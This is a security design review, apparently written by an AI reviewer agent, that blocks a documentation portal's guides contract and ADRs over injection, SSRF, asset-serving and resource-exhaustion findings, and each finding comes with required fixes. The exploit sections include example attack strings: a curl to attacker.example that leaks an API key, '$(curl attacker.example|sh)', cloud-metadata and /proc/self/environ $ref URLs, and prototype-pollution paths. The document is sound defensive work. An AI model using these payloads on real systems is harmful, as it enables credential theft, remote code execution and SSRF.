# Security Design Review: Guides Contract v0.2 and M1 ADRs

Date: 2026-11-26. Reviewer: `security-reviewer` agent. Reviewed at commit `65fa0f9`.

No code exists yet. "Confirmed" means the document as written permits the problem; nothing was
reproduced.

## Verdict: block

Four confirmed high findings. Contract v0.2 should not be confirmed to the guides module, and ADRs
0003 and 0005 should not be accepted, until H1 to H4 are in the text. ADRs 0001 and 0002 pass. ADRs
0004 and 0006 pass with the fixes below.

## Findings

### H1. High, confirmed. Variables are in-band text, and `{{api_key}}` is usable by bundles

Contract 4.6; ADR 0005 (`body.kind:'json'` "strings inside may hold '{{var}}'", `Sample.code: string`).

**Exploit:** the 4.6 ordering rules cover page source only. A spec example string
`https://attacker.example/?k={{api_key}}` reaches the body and emitted code as text identical to a
variable, and the browser fills in the reader's key. A bundle can do the same with an ordinary code
block (`curl https://attacker.example/?k={{api_key}}`) or a non-auth sample field.

**Required changes:**

- 4.6: remove `api_key` from the table and add: "`{{api_key}}` is not available to bundles; anywhere
  in a bundle it is `unknown-variable`. Credentials are placed only by the portal's sample
  generator." Section 9 says the guides module never writes it, so this costs nothing.
- 4.6, new item 6: "Published output carries variables as structure (a placeholder element or a
  segment list), never as marker text. Client-side substitution fills only those placeholders and
  must never search text or code for `{{`. Text taken from the spec never contains a variable."
- ADR 0005: JSON body string leaves become `Text`; `Sample.code` becomes `(string | { var })[]`;
  delete "strings inside may hold".
- Contract, near line 533: check how the escape for a literal `{{` is written and correct it if the
  rendered text is wrong.

### H2. High, confirmed. Runtime values reach code and requests unencoded

Contract 4.6 items 4 and 5, section 9; ADR 0005.

**Exploit:** captured values are API response data that a third party can set. Emitter escaping
runs at publish time on a placeholder, so a captured `$(curl attacker.example|sh)` substituted in
the browser into a `bash` block or a curl string is run by the reader. A captured `../admin?x=` in a
path parameter makes "Try it" call an operation the tenant did not enable. CR/LF in a header value
injects headers.

**Required changes:**

- 4.6: "A captured value is a string, number or boolean of at most 2,048 characters, read by
  own-property lookup; otherwise nothing is captured."
- 4.6: "In an ordinary code block a captured value is substituted only if it matches
  `^[A-Za-z0-9._:~-]{1,256}$`; otherwise the placeholder stays."
- 4.6: "Every runtime substitution into a sample or request goes through the target language's
  encoder and the parameter location's encoder (path segment: `/ ? # %` encoded, `.` and `..`
  rejected). String replacement into emitted code does not conform."
- 4.3: "Header names match the RFC 9110 `token`; values contain no CR, LF or NUL; otherwise
  `invalid-sample`. Checked again after substitution."

### H3. High, confirmed. Proxy enforcement is not required, and the deny list is incomplete

Contract 4.3 (the header rules for sample values).

**Exploit:** the validator is not in the path of a direct proxy call. A GET sample with undeclared
`X-HTTP-Method-Override: DELETE` is only a warning and is "sent as written", so a write passes a
read-only gate.

**Required changes:**

- Add to 4.3: "This table is a bundle check, not a security control. The proxy and MCP enforce the
  same rules on every request, server-side, from the published model: destination only from the
  model's servers (server variables limited to their `enum`, or `[A-Za-z0-9.-]+`), subject to the
  URL policy in ADR 0003; final method and path must match an operation the tenant enabled."
- Extend the list with: `Forwarded`, `X-Forwarded-*`, `X-Real-IP`, `Via`, `TE`, `Trailer`,
  `Upgrade`, `Keep-Alive`, `Expect`, `Origin`, `Referer`, `X-HTTP-Method`,
  `X-HTTP-Method-Override`, `X-Method-Override`, `Proxy-*`, `Sec-*`, and the portal's internal
  prefix.

### H4. High, confirmed. The publisher fetch loop has no URL policy and no bounds

ADR 0003 ("under its own URL policy", "until closed").

**Exploit:** an `example` with `$ref: http://169.254.169.254/latest/meta-data/…` or
`file:///proc/self/environ` is published in the portal. A server that returns a fresh `$ref` in
every document never terminates.

**Required change:** add a "URL policy" section covering the root spec URL and every `$ref`:

- `https` only; `file:` only in the local CLI and only under the root's directory; no userinfo.
- Resolve, then reject loopback, RFC 1918, 169.254/16, 100.64/10, 0.0.0.0, IPv6 ULA and link-local,
  and v4-mapped addresses; connect to the vetted address.
- Redirects are re-vetted per hop, maximum 3.
- No credentials or cookies are sent.
- Caps: 100 documents, 10 MB each, 50 MB total, 10 s each, 60 s total.
- Uploaded specs get a synthetic URI.

### M5. Medium, confirmed. Asset serving has no headers

Contract section 2 (asset types and SVG sanitizing).

**Exploit:** under `host.com/docs`, a docs author with no access to the main site ships an SVG or
polyglot. Opened directly, it runs in the `host.com` origin and can take the customer's sessions.
The customer's reverse proxy can also strip our headers.

**Required change:** "Assets are served from a dedicated per-tenant asset origin, never the
portal's or the customer's origin. Every response has: `Content-Type` from the portal's extension
table; `X-Content-Type-Options: nosniff`; `Content-Security-Policy: default-src 'none'; sandbox`;
`Content-Disposition: attachment` for svg, pdf, json and zip. SVG sanitizing is an allowlist that
rejects DOCTYPE, entities, `script`, `foreignObject`, event attributes and external references. A
zip is never unpacked."

### M6. Medium, confirmed. Derived work is unbounded

ADR 0005 ("recursion cut on second visit"); ADR 0003 (`maxDepth?`; `Limits` covers parsing only).

**Exploit:** twelve acyclic schemas, each with ten properties referencing the next, give 10^12
example nodes from a spec of a few KB. Shiki's JS regex engine also runs on tenant strings with no
time bound.

**Required change:** "`synthesizeExample`, `toJsonSchema`, `resolveSchemaView` and
`buildPortalBundle` take node and byte budgets from `Limits`; `maxDepth` is required; over budget
yields a finding and truncated output. Highlighting has an input cap and falls back to plain text.
Publishing runs in a killable per-tenant worker with a time limit."

### M7. Medium, suspected. Prototype pollution through patches and tenant-keyed lookups

ADR 0004; ADR 0003's own `$ref` resolver; contract `capture` paths.

**Exploit:** `add` at `/paths/__proto__/x`, or `$ref: '#/constructor/prototype'`, touches
`Object.prototype` in a shared process. If the dashboard posts ops back, they are attacker-chosen.

**Required change:** "Pointer traversal and every lookup keyed by tenant text use own properties
only; `__proto__`, `constructor` and `prototype` segments are a conflict; tenant-keyed maps are
`Map` or null-prototype. The overlay stores engine-generated patches by fix id; clients send a fix
id and `inputs` only, never ops."

### L8. Low, confirmed. Parser limits

Contract section 4 (frontmatter) and section 2.

**Required changes:**

- "Anchors, aliases, tags and merge keys are detected in the token stream before any expansion;
  duplicate keys are `invalid-frontmatter`; frontmatter is at most 16 KB."
- `guides.json` has no size limit: add 1 MB, with nav depth checked while parsing.
- Add a Markdown nesting cap of 32.
- Report schema: `maxItems: 1000` on the three arrays; `maxLength: 197` on the slug.

### L9. Low, confirmed. External links

Contract 4.5; ADR 0006.

**Required changes:**

- "Parsed with the WHATWG URL parser; `https`, a host, no userinfo, no control characters; rendered
  with `rel="noopener noreferrer nofollow ugc"`."
- ADR 0006: `mdast-util-gfm` turns on autolink literals, which the contract forbids; load the four
  extensions individually.
- ADR 0006: say that images in spec descriptions are not loaded from remote hosts.

### L10. Low, confirmed. Theme tokens

ADR 0006.

- `shadow` is a token group with no typed serializer listed. Make it structured
  (`x, y, blur, spread, color`).
- Add: "serializer output never contains `<`, `;`, `}`, `\` or `url(`".

## Notes

- **Slug namespace:** the rule sits in section 9. Move it to section 3 as normative: "Guides are
  served under a prefix reserved for them."
- **Percent-decoding:** sound, because it is a lookup. Add: "invalid UTF-8 after decoding is
  `link-not-allowed`; targets resolve by lookup, never by path joining."
- **Heading anchors:** they become `id`s, which can clobber DOM globals. Prefix them, or ban global
  named lookups in client code.
- **Section 6:** state now that extraction enforces the section 2 limits on actual bytes, and
  rejects links, absolute paths and `..`. The pure validator cannot see symlinks, so assign that
  check to the control plane.
- **report.json:** adequate as plain text.

## Controls the documents get right

- No raw HTML, a closed component set, the `<` rule, and verbatim attribute values.
- Single-pass substitution, with variables excluded from links, attributes and frontmatter.
- The path character rules.
- Ids never used as URL segments.
- Ajv rejected, and `pattern` regexes not run without a bound.
- `test`-guarded patches.
- `dangerouslySetInnerHTML` banned.
- Typed token serialization.
- Credentials as variables, never stored.

## Not reviewed

- `guides-contract-feedback.md`, `guides-module-brief.md`, `guides-module-status.md`.
- `docs/milestones/m1.md`, beyond a keyword search.
- The fixture corpus.
- Dependency provenance (`yaml`, `shiki`, mdast packages).
- Anything in M2 to M6 that these documents do not specify: proxy internals, MCP, tenancy, the
  brand extractor, custom domains.
